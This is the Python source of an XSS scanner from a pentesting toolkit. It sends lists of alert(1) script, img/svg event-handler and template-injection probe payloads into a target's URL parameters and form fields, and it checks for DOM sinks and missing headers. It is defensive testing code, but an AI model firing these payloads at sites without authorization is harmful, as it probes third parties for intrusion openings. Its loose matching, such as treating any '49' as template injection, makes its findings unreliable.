#!/usr/bin/env python3
"""
xss_scanner.py - Cross-Site Scripting (XSS) Scanner
Part of STRYKER by Andrews

LEGAL NOTICE: For authorized penetration testing ONLY.
Only use against systems you own or have explicit written permission to test.
"""

import argparse
import sys
import io
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace", line_buffering=True)

import httpx
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.rule import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box

console = Console(highlight=False)

# ── Payloads ───────────────────────────────────────────────────────────────────

REFLECTED_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '<<script>alert(1)//<</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '"><svg/onload=alert(1)>',
    '{{7*7}}',                      # Template injection probe
    '${7*7}',                       # Template injection probe
]

DOM_PAYLOADS = [
    '#<script>alert(1)</script>',
    '#"><img src=x onerror=alert(1)>',
    '#javascript:alert(1)',
    '#<svg onload=alert(1)>',
]

HEADER_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
]

# Common input field names to test in forms
COMMON_INPUTS = [
    "q", "s", "search", "query", "keyword", "term",
    "name", "username", "user", "email",
    "message", "comment", "text", "content",
    "url", "redirect", "return", "next", "ref",
    "id", "page", "cat", "category", "tag",
]

# ── Finding ────────────────────────────────────────────────────────────────────

class Finding:
    def __init__(self, url, param, payload, vuln_type, evidence="", severity="High"):
        self.url       = url
        self.param     = param
        self.payload   = payload
        self.vuln_type = vuln_type
        self.evidence  = evidence
        self.severity  = severity

    def __str__(self):
        return f"[{self.severity}][{self.vuln_type}] {self.url} | param={self.param}"


# ── Helpers ────────────────────────────────────────────────────────────────────

def is_reflected(payload, response_text):
    """Check if payload or key parts of it appear in the response."""
    # Direct reflection
    if payload in response_text:
        return True, "Payload reflected directly in response"

    # Check for key dangerous parts
    dangerous = [
        "<script>", "onerror=", "onload=", "javascript:",
        "alert(1)", "<svg", "<img src=x"
    ]
    for d in dangerous:
        if d.lower() in response_text.lower() and d.lower() in payload.lower():
            return True, f"Dangerous token '{d}' reflected in response"

    # Template injection check
    if "{{7*7}}" in payload and "49" in response_text:
        return True, "Template injection confirmed — {{7*7}} evaluated to 49"
    if "${7*7}" in payload and "49" in response_text:
        return True, "Template injection confirmed — ${7*7} evaluated to 49"

    return False, ""


def extract_forms(html, base_url):
    """Extract form action URLs and input names from HTML."""
    forms = []
    form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
    action_pattern = re.compile(r'action=["\']([^"\']*)["\']', re.IGNORECASE)
    input_pattern  = re.compile(r'<input[^>]*name=["\']([^"\']*)["\']', re.IGNORECASE)
    method_pattern = re.compile(r'method=["\']([^"\']*)["\']', re.IGNORECASE)

    for form_match in form_pattern.finditer(html):
        form_html = form_match.group(0)
        action_match = action_pattern.search(form_html)
        method_match = method_pattern.search(form_html)

        action = action_match.group(1) if action_match else base_url
        method = method_match.group(1).upper() if method_match else "GET"

        # Resolve relative URLs
        if action.startswith("/"):
            parsed = urllib.parse.urlparse(base_url)
            action = f"{parsed.scheme}://{parsed.netloc}{action}"
        elif not action.startswith("http"):
            action = base_url

        inputs = input_pattern.findall(form_html)
        if inputs:
            forms.append({"action": action, "method": method, "inputs": inputs})

    return forms


# ── Checks ─────────────────────────────────────────────────────────────────────

def check_reflected_get(client, url, baseline_text):
    """Test URL query parameters for reflected XSS."""
    findings = []
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))

    # If no params in URL, try common ones
    if not params:
        params = {k: "test" for k in COMMON_INPUTS[:5]}

    for param in params:
        for payload in REFLECTED_PAYLOADS:
            test_params = dict(urllib.parse.parse_qsl(parsed.query))
            test_params[param] = payload
            test_url = parsed._replace(
                query=urllib.parse.urlencode(test_params)
            ).geturl()

            try:
                resp = client.get(test_url, timeout=10)
                reflected, evidence = is_reflected(payload, resp.text)

                if reflected:
                    findings.append(Finding(
                        url=url, param=param, payload=payload,
                        vuln_type="Reflected XSS (GET)",
                        evidence=evidence,
                        severity="High"
                    ))
                    break  # one finding per param is enough

            except httpx.RequestError:
                pass

    return findings


def check_reflected_post(client, url, html):
    """Test form inputs for reflected XSS via POST."""
    findings = []
    forms = extract_forms(html, url)

    for form in forms:
        for input_name in form["inputs"]:
            for payload in REFLECTED_PAYLOADS[:5]:  # top 5 payloads for POST
                data = {i: "test" for i in form["inputs"]}
                data[input_name] = payload

                try:
                    if form["method"] == "POST":
                        resp = client.post(form["action"], data=data, timeout=10)
                    else:
                        resp = client.get(form["action"], params=data, timeout=10)

                    reflected, evidence = is_reflected(payload, resp.text)
                    if reflected:
                        findings.append(Finding(
                            url=form["action"],
                            param=input_name,
                            payload=payload,
                            vuln_type=f"Reflected XSS ({form['method']} form)",
                            evidence=evidence,
                            severity="High"
                        ))
                        break

                except httpx.RequestError:
                    pass

    return findings


def check_dom_xss(client, url):
    """Check for DOM-based XSS indicators in page source."""
    findings = []

    # Dangerous DOM sinks
    dom_sinks = [
        "document.write(",
        "innerHTML",
        "outerHTML",
        "eval(",
        "setTimeout(",
        "setInterval(",
        "document.URL",
        "location.hash",
        "location.search",
        "document.referrer",
    ]

    try:
        resp = client.get(url, timeout=10)
        for sink in dom_sinks:
            if sink.lower() in resp.text.lower():
                findings.append(Finding(
                    url=url, param="DOM",
                    payload=sink,
                    vuln_type="DOM XSS Sink Detected",
                    evidence=f"Dangerous sink '{sink}' found in page source",
                    severity="Medium"
                ))

    except httpx.RequestError:
        pass

    return findings


def check_headers(client, url):
    """Check for missing security headers that enable XSS."""
    findings = []

    try:
        resp = client.get(url, timeout=10)
        headers = {k.lower(): v for k, v in resp.headers.items()}

        missing = []
        if "content-security-policy" not in headers:
            missing.append("Content-Security-Policy")
        if "x-xss-protection" not in headers:
            missing.append("X-XSS-Protection")
        if "x-content-type-options" not in headers:
            missing.append("X-Content-Type-Options")

        if missing:
            findings.append(Finding(
                url=url, param="HTTP Headers",
                payload="N/A",
                vuln_type="Missing Security Headers",
                evidence=f"Missing: {', '.join(missing)}",
                severity="Medium"
            ))

    except httpx.RequestError:
        pass

    return findings


# ── Scanner ────────────────────────────────────────────────────────────────────

def scan(url, checks, headers, cookies):
    all_findings = []

    with httpx.Client(
        headers=headers,
        cookies=cookies,
        follow_redirects=True,
        verify=False
    ) as client:

        try:
            baseline = client.get(url, timeout=10)
            baseline_text = baseline.text
            console.print(f"  [dim]Baseline:[/dim] status=[cyan]{baseline.status_code}[/cyan] size=[cyan]{len(baseline_text)}[/cyan] chars")
            console.print()
        except httpx.RequestError as e:
            console.print(f"  [red]Could not reach {url}: {e}[/red]")
            return []

        if "reflected" in checks or "all" in checks:
            console.print("  [dim]Testing reflected XSS via GET parameters...[/dim]")
            all_findings += check_reflected_get(client, url, baseline_text)

        if "forms" in checks or "all" in checks:
            console.print("  [dim]Testing form inputs for reflected XSS...[/dim]")
            all_findings += check_reflected_post(client, url, baseline_text)

        if "dom" in checks or "all" in checks:
            console.print("  [dim]Checking for DOM XSS sinks...[/dim]")
            all_findings += check_dom_xss(client, url)

        if "headers" in checks or "all" in checks:
            console.print("  [dim]Checking security headers...[/dim]")
            all_findings += check_headers(client, url)

    return all_findings


# ── Output ─────────────────────────────────────────────────────────────────────

def print_findings(findings):
    console.print()
    if not findings:
        console.print(Panel(
            "[green]No XSS vulnerabilities detected.[/green]\n"
            "[dim]This does not guarantee the target is secure.[/dim]",
            title="Result", border_style="green"
        ))
        return

    high   = [f for f in findings if f.severity == "High"]
    medium = [f for f in findings if f.severity == "Medium"]

    console.print(Panel(
        f"[red]High severity:[/red]   [bold red]{len(high)}[/bold red]\n"
        f"[yellow]Medium severity:[/yellow] [bold yellow]{len(medium)}[/bold yellow]\n"
        f"[white]Total:[/white]           [bold]{len(findings)}[/bold]",
        title=f"[bold red]{len(findings)} Finding(s)[/bold red]",
        border_style="red"
    ))

    table = Table(box=box.ROUNDED, show_lines=True)
    table.add_column("Severity", width=8,  justify="center")
    table.add_column("Type",     style="red",   no_wrap=True)
    table.add_column("Param",    style="cyan",  no_wrap=True)
    table.add_column("Payload",  style="magenta", max_width=35)
    table.add_column("Evidence", style="dim")

    for f in findings:
        sev_color = "[bold red]HIGH[/bold red]" if f.severity == "High" else "[yellow]MED[/yellow]"
        table.add_row(sev_color, f.vuln_type, f.param, f.payload, f.evidence)

    console.print(table)


# ── CLI ────────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="XSS Scanner - part of STRYKER",
        epilog="""
Examples:
  python web/xss_scanner.py -u "https://example.com/search?q=hello"
  python web/xss_scanner.py -u "https://example.com" --checks reflected dom
  python web/xss_scanner.py -u "https://example.com" --checks all -o results.txt

Only test systems you own or have written permission to test.
        """
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument(
        "--checks", nargs="+",
        choices=["reflected", "forms", "dom", "headers", "all"],
        default=["all"],
        help="Which checks to run (default: all)"
    )
    parser.add_argument("-H", "--header", action="append", default=[],
                        help="Custom header")
    parser.add_argument("-c", "--cookie", action="append", default=[],
                        help="Cookie")
    parser.add_argument("-o", "--output", help="Save findings to file")
    return parser.parse_args()


def main():
    args = parse_args()

    console.print(Panel.fit(
        "[bold red]STRYKER[/bold red] [white]//[/white] [cyan]XSS Scanner[/cyan]\n"
        "[dim]Reflected | DOM | Forms | Headers | For authorized testing only[/dim]",
        border_style="red"
    ))
    console.print()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    cookies = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                  console=console) as progress:
        task = progress.add_task(f"Scanning {args.url[:60]}...", total=None)
        findings = scan(args.url, args.checks, headers, cookies)
        progress.update(task, completed=True)

    print_findings(findings)

    if args.output and findings:
        with open(args.output, "w") as f:
            for finding in findings:
                f.write(str(finding) + "\n")
        console.print(f"\n[green]Findings saved to {args.output}[/green]")


if __name__ == "__main__":
    main()